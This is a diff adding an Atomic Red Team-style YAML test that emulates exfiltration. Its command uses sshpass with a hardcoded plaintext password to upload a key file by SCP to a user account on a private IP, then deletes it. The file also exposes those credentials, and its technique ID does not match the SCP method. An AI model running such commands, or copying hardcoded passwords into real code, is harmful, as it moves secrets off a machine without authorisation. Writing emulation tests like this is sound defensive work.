@@ -1,0 +1,18 @@
+attack_technique: T1071.001
+display_name: 'Upload File to Remote Server via SCP'
+atomic_tests:
+- name: Upload File to Remote Server
+  description: |
+    This atomic test uploads a file to a remote server using the SCP command.
+  supported_platforms:
+  - linux
+  dependencies:
+  - prereq_command: |
+      if [ -x "$(command -v scp)" ]; then exit 0; else exit 1; fi;
+    get_prereq_command: |
+      sudo apt-get install -y openssh-client
+  executor:
+    command: |
+      sshpass -p 'wannawm5210..' scp /tmp/2.251.key zhenkunluo@10.11.37.76:/Users/zhenkunluo
+    cleanup_command: |
+      sshpass -p 'wannawm5210..' ssh zhenkunluo@10.11.37.76 "rm -f /Users/zhenkunluo/2.251.key"
